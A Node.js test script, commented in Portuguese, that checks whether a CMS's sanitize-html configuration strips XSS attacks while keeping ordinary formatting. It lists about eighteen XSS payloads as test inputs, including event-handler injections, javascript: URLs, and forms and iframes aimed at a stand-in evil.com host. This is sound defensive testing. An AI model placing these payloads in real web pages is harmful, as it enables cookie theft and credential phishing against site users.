#!/usr/bin/env node
/**
 * Prova que a sanitização de HTML barra XSS.
 *
 * Existe porque a biblioteca foi trocada (isomorphic-dompurify -> sanitize-html)
 * depois que a primeira quebrou em produção ao carregar jsdom. Trocar a peça de
 * segurança sem provar que a nova protege igual seria substituir um problema
 * visível por um invisível.
 *
 *   node scripts/test-sanitize.mjs
 */

import sanitize from 'sanitize-html'

const ALLOWED_TAGS = [
  'p', 'br', 'strong', 'b', 'em', 'i', 'u', 's', 'span', 'div',
  'h2', 'h3', 'h4', 'h5', 'h6',
  'ul', 'ol', 'li',
  'a', 'blockquote', 'code', 'pre', 'hr',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
  'img',
]

const OPCOES = {
  allowedTags: ALLOWED_TAGS,
  allowedAttributes: {
    a: ['href', 'target', 'rel', 'title'],
    img: ['src', 'alt', 'title', 'width', 'height'],
    '*': ['class'],
  },
  allowedSchemes: ['http', 'https', 'mailto', 'tel'],
  allowedSchemesAppliedToAttributes: ['href', 'src'],
  nonTextTags: ['script', 'style', 'textarea', 'option', 'noscript'],
  transformTags: {
    a: (tagName, attribs) => {
      const href = attribs.href ?? ''
      const externo = /^https?:\/\//i.test(href)
      return {
        tagName,
        attribs: externo
          ? { ...attribs, target: '_blank', rel: 'noopener noreferrer nofollow' }
          : attribs,
      }
    },
  },
  disallowedTagsMode: 'discard',
}

const limpar = (sujo) => (sujo ? sanitize(sujo, OPCOES) : '')

let passou = 0
let total = 0

/** proibido: trechos que NÃO podem sobrar na saída. */
function bloqueia(nome, entrada, proibido) {
  total++
  const saida = limpar(entrada)
  const vazou = proibido.filter((p) => saida.toLowerCase().includes(p.toLowerCase()))
  if (vazou.length === 0) {
    passou++
    console.log(`  PASSOU  ${nome}`)
  } else {
    console.log(`  FALHOU  ${nome}\n          vazou: ${vazou.join(', ')}\n          saida: ${saida}`)
  }
}

function preserva(nome, entrada, esperado) {
  total++
  const saida = limpar(entrada)
  const faltando = esperado.filter((e) => !saida.includes(e))
  if (faltando.length === 0) {
    passou++
    console.log(`  PASSOU  ${nome}`)
  } else {
    console.log(`  FALHOU  ${nome}\n          perdeu: ${faltando.join(', ')}\n          saida: ${saida}`)
  }
}

console.log('\nSanitizacao de HTML do CMS\n')
console.log('Ataques que devem ser BARRADOS:')

bloqueia('script inline', '<p>oi</p><script>alert(1)</script>', ['<script', 'alert(1)'])
bloqueia('script com atributos', '<script type="text/javascript">fetch("/roubar")</script>', ['<script', 'fetch('])
bloqueia('onerror em img', '<img src=x onerror="alert(document.cookie)">', ['onerror', 'alert'])
bloqueia('onclick em link', '<a href="#" onclick="roubar()">clique</a>', ['onclick', 'roubar'])
bloqueia('onload em body', '<body onload="alert(1)">texto</body>', ['onload', 'alert'])
bloqueia('href javascript:', '<a href="javascript:alert(1)">link</a>', ['javascript:'])
bloqueia('href com espacos e maiusculas', '<a href="  JaVaScRiPt:alert(1)">x</a>', ['javascript:', 'JaVaScRiPt'])
bloqueia('src data: com script', '<img src="data:text/html;base64,PHNjcmlwdD4=">', ['data:text/html'])
bloqueia('iframe', '<iframe src="https://evil.com"></iframe>', ['<iframe'])
bloqueia('objeto embutido', '<object data="evil.swf"></object><embed src="x">', ['<object', '<embed'])
bloqueia('formulario que rouba credencial', '<form action="https://evil.com"><input name="senha"></form>', ['<form', '<input'])
bloqueia('style com expressao', '<div style="background:url(javascript:alert(1))">x</div>', ['javascript:'])
bloqueia('tag style inteira', '<style>body{display:none}</style><p>ok</p>', ['<style', 'display:none'])
bloqueia('svg com onload', '<svg onload="alert(1)"></svg>', ['<svg', 'onload'])
bloqueia('meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.com">', ['<meta', 'refresh'])
bloqueia('script aninhado em tag permitida', '<div><p><script>alert(1)</script></p></div>', ['<script', 'alert'])
bloqueia('script quebrado tentando escapar', '<scr<script>ipt>alert(1)</script>', ['<script'])
bloqueia('atributo de evento maiusculo', '<img src="x" ONERROR="alert(1)">', ['onerror', 'alert'])

console.log('\nFormatacao legitima que deve SOBREVIVER:')

preserva('paragrafo e negrito', '<p>Conta com <strong>nivel maximo</strong></p>', ['<p>', '<strong>'])
preserva('lista', '<ul><li>Item um</li><li>Item dois</li></ul>', ['<ul>', '<li>'])
preserva('titulo', '<h2>Sobre o produto</h2>', ['<h2>'])
preserva('link interno', '<a href="/produtos">ver</a>', ['href="/produtos"'])
preserva('link externo', '<a href="https://discord.gg/x">discord</a>', ['href="https://discord.gg/x"'])
preserva('imagem https', '<img src="https://cdn.exemplo.com/a.png" alt="produto">', ['<img', 'src="https://cdn.exemplo.com/a.png"'])
preserva('tabela', '<table><tr><td>a</td></tr></table>', ['<table>', '<td>'])

console.log('\nEndurecimento de link externo:')
total++
{
  const saida = limpar('<a href="https://evil.com">x</a>')
  const ok = saida.includes('rel="noopener noreferrer nofollow"') && saida.includes('target="_blank"')
  if (ok) { passou++; console.log('  PASSOU  link externo recebe rel=noopener e target=_blank') }
  else console.log(`  FALHOU  link externo sem rel/target\n          saida: ${saida}`)
}

console.log(`\n${passou}/${total} cenarios corretos\n`)
process.exit(passou === total ? 0 : 1)
